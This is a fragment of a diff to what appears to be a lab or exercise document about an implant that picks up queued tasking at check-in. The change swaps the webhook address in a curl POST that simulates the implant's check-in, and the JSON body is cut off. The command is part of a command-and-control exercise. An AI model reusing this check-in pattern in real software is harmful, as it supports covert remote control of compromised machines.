@@ -345,7 +345,7 @@ Inspect the execution and answer:
 After a survey queues tasking, the implant receives that task on its next check-in.
 
 ```
-curl -fsS -X POST http://20.30.40.155/webhook/agent-checkin \
+curl -fsS -X POST http://20.30.40.153:5678/webhook-test/agent-checkin \
   -H 'Content-Type: application/json' \
   -d '{
     "event_type": "agent_checkin",
